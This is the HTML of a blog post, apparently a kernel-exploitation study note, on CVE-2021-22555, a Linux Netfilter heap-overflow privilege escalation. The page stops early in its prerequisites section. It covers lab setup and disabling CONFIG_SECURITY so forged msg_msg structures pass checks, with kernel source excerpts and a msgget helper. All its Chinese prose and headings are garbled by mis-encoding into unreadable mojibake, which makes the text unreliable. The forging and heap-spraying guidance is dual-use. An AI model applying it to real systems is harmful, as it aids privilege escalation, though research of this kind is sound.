<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="ç¯å¢ƒæ­å»º       å‚è€ƒæ–‡ç« ï¼š CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com) æˆ–è€…æˆ‘å†™çš„èœé¸¡é¡¹ç›®ï¼š KernelAll                     ğŸ”ºæ³¨ï¼š       æ³¨æ„çš„æ˜¯ï¼Œåœ¨æˆ‘å†™çš„é¡¹ç›®é‡Œçš„CVEç¯å¢ƒä¸­ï¼Œå»æ‰äº†é…ç½®ï¼šCONFIG_SECURITY&#x3D;nï¼ŒåŸå› æ˜¯åœ¨load_">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-22555">
<meta property="og:url" content="http://pig-007.github.io/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="ç¯å¢ƒæ­å»º       å‚è€ƒæ–‡ç« ï¼š CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com) æˆ–è€…æˆ‘å†™çš„èœé¸¡é¡¹ç›®ï¼š KernelAll                     ğŸ”ºæ³¨ï¼š       æ³¨æ„çš„æ˜¯ï¼Œåœ¨æˆ‘å†™çš„é¡¹ç›®é‡Œçš„CVEç¯å¢ƒä¸­ï¼Œå»æ‰äº†é…ç½®ï¼šCONFIG_SECURITY&#x3D;nï¼ŒåŸå› æ˜¯åœ¨load_">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220501113945278.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200120767.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200155851.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200407354.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508204003227.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110107919.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110346186.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110927931.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513111337456.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513112451162.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513115154194.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220515143144038.png">
<meta property="article:published_time" content="2022-04-15T04:20:33.000Z">
<meta property="article:modified_time" content="2022-05-24T08:26:28.411Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="Kernel_CVE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"><title>CVE-2021-22555 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">CVE-2021-22555</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-04-15</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-05-24</span></span></div></header><div class="post-body">
        <h1 id="ç¯å¢ƒæ­å»º"   >
          <a href="#ç¯å¢ƒæ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1>
      <p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æˆ–è€…æˆ‘å†™çš„èœé¸¡é¡¹ç›®ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll.git" >KernelAll</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="ğŸ”ºæ³¨ï¼š"   >
          <a href="#ğŸ”ºæ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h2>
      <p>æ³¨æ„çš„æ˜¯ï¼Œåœ¨æˆ‘å†™çš„é¡¹ç›®é‡Œçš„CVEç¯å¢ƒä¸­ï¼Œå»æ‰äº†é…ç½®ï¼š<code>CONFIG_SECURITY=n</code>ï¼ŒåŸå› æ˜¯åœ¨<code>load_msg()</code>å‡½æ•°ä¸­ç”³è¯·<code>msg_msg</code>ç»“æ„ä½“æ—¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œä¼šè°ƒç”¨åˆ°<code>security_msg_msg_alloc()</code>å‡½æ•°ï¼Œç»™<code>msg_msg</code>ç»“æ„ä½“ä¸­çš„<code>security</code>æŒ‡é’ˆèµ‹å€¼ï¼Œå¯¼è‡´ä¸‹é¢æ¼æ´åˆ©ç”¨æ—¶è¯»å–ä¼ªé€ <code>msg_msg</code>ç»“æ„ä½“ç”±äºæ£€æµ‹<code>security</code>å¯¼è‡´å‡ºé”™ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /ipc/msgutil.c</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è€Œå»æ‰äº†é…ç½®ï¼š<code>CONFIG_SECURITY=n</code>ï¼Œå¯ä»¥ä¸ç”¨<code>security</code>æŒ‡é’ˆï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºé”™äº†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/security.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq, struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct task_struct *target, <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* CONFIG_SECURITY */</span></span></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					       <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct task_struct *target,</span></span></span><br><span class="line"><span class="params"><span class="function">					    <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>	<span class="comment">/* CONFIG_SECURITY */</span></span></span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯åœ¨<code>bsauce</code>å¸ˆå‚…æä¾›çš„ç¯å¢ƒä¸­æœ‰æ·»åŠ è¯¥é…ç½®ï¼Œè€Œ<code>security</code>æŒ‡é’ˆçš„å€¼å´è¿˜æ˜¯ä¸ºç©ºã€‚ç®€å•çœ‹äº†ä¸€ä¸‹æºç ï¼Œå¦‚ä¸‹å‡½æ•°é“¾</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_msg()-&gt;security_msg_msg_alloc()-&gt;lsm_msg_msg_alloc()</span><br></pre></td></tr></table></div></figure>

<p>å¯¹äº<code>lsm_msg_msg_alloc()</code>å‡½æ•°å¦‚ä¸‹å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lsm_msg_msg_alloc</span><span class="params">(struct msg_msg *mp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (blob_sizes.lbs_msg_msg == <span class="number">0</span>) &#123;</span><br><span class="line">		mp-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mp-&gt;security = kzalloc(blob_sizes.lbs_msg_msg, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (mp-&gt;security == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿›è¡Œç›¸å…³èµ‹å€¼ï¼Œå¦‚æœæ»¡è¶³<code>blob_sizes.lbs_msg_msg == 0</code>é‚£ä¹ˆå…¶<code>security</code>æŒ‡é’ˆä¸ºç©ºï¼Œåç»­æ£€æµ‹æ—¶ä¹Ÿä¾æ®æ­¤åˆ¤æ–­ä¸æ£€æµ‹ã€‚è€Œå¯¹äºè¿™ä¸ª<code>blob_sizes.lbs_msg_msg</code>ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå¯èƒ½æ˜¯æˆ‘çš„ç›¸å…³é…ç½®é—®é¢˜å§ã€‚è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘å°±ç›´æ¥å°†è¿™ä¸ªé…ç½®å»æ‰äº†ã€‚</p>
<p>æ­¤å¤–ç»è¿‡å®é™…æµ‹è¯•ï¼Œæºç ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œå…¶å®<code>security</code>ä¹Ÿå°±æ˜¯ä¸€ä¸ªå †åœ°å€(ä»¥0x8é€’å¢)ï¼Œæ˜¯ä¸æ–­å˜åŒ–çš„ï¼Œä½†æ˜¯å¦‚æœèƒ½æ³„éœ²å‡ºå…¶ä¸­ä¸€ä¸ªï¼Œé‚£ä¹ˆåç»­æ£€æµ‹å°±èƒ½éƒ½é€šè¿‡äº†ã€‚</p>

        <h1 id="å‰ç½®çŸ¥è¯†"   >
          <a href="#å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1>
      <p>å®Œæˆè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨è¿˜æ˜¯éœ€è¦ä¸€äº›å‰ç½®çŸ¥è¯†çš„ï¼Œåˆšå¥½åˆ©ç”¨è¿™ä¸ªæ¼æ´é‡æ–°å®Œå–„ä¸€ä¸‹ç›¸å…³çš„çŸ¥è¯†ç‚¹ã€‚</p>

        <h2 id="1-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024"   >
          <a href="#1-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024" class="headerlink" title="1.msg_msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024"></a>1.msg_msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024</h2>
      <p>è¿™ä¸ªåœ¨ä¹‹å‰ä¹Ÿæ€»ç»“è¿‡ï¼Œä¸è¿‡æ€»ç»“å¾—æœ‰äº›é”™è¯¯ï¼Œä¹Ÿä¸å¤ªå®Œå–„ï¼Œè¿™é‡Œå†å¥½å¥½æ€»ç»“ä¸€ä¸‹</p>
<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#%E5%88%86%E9%85%8D%EF%BC%88GFP-KERNEL-ACCOUNT%EF%BC%89%EF%BC%9Amsgsnd-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" >ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252558" >Linuxå†…æ ¸ä¸­åˆ©ç”¨msg_msgç»“æ„å®ç°ä»»æ„åœ°å€è¯»å†™ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html" >Linuxçš„è¿›ç¨‹é—´é€šä¿¡ - æ¶ˆæ¯é˜Ÿåˆ— Â· Poor Zorroâ€™s Linux Book (gitbooks.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹</p>
<p>è™½ç„¶å†™çš„æ˜¯æœ€å¤§<code>kmalloc-1024</code>ï¼Œä½†æ˜¯åœ¨å †å–·æ—¶ï¼Œå¯ä»¥è¿ç»­<code>kmalloc(1024)</code>ä»è€Œè·å¾—è¿ç»­çš„å †å†…å­˜åˆ†å¸ƒï¼Œè¿™æ ·éƒ½é‡Šæ”¾æ‰ä¹‹åå†ç»è¿‡å›æ”¶æœºåˆ¶å°±å¯ä»¥ç”³è¯·åˆ°æ›´å¤§çš„<code>kmallo-xx</code>äº†ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º"   >
          <a href="#â‘ åˆ›å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <ul>
<li><p>é¦–å…ˆåˆ›å»º<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œå¯¹åº”äºå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//keyè¦ä¹ˆä½¿ç”¨ftok()ç®—æ³•ç”Ÿæˆ,è¦ä¹ˆæŒ‡å®šä¸ºIPC_PRIVATE</span></span><br><span class="line"><span class="comment">//ä»£è¡¨ç€è¯¥æ¶ˆæ¯é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­å”¯ä¸€çš„æ ‡è¯†ç¬¦</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨IPC_PRIVATEä¼šç”Ÿæˆå…¨æ–°çš„æ¶ˆæ¯é˜Ÿåˆ—IPCå¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ç®€å•å°è£…çš„<code>msgget</code>å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å·<code>__NR_msgget</code>ï¼Œä¹‹åä¿å­˜æ•°æ®çš„æ¶ˆæ¯å°±ä¼šåœ¨è¿™ä¸ª<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œä»¥åŠå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„ä¸‹è¿›è¡Œåˆ›å»º</p>
</li>
</ul>

        <h4 id="â‘¡æ•°æ®ä¼ è¾“"   >
          <a href="#â‘¡æ•°æ®ä¼ è¾“" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æ•°æ®ä¼ è¾“" class="headerlink" title="â‘¡æ•°æ®ä¼ è¾“"></a>â‘¡æ•°æ®ä¼ è¾“</h4>
      <ul>
<li><p>å†™å…¥æ¶ˆæ¯ï¼š</p>
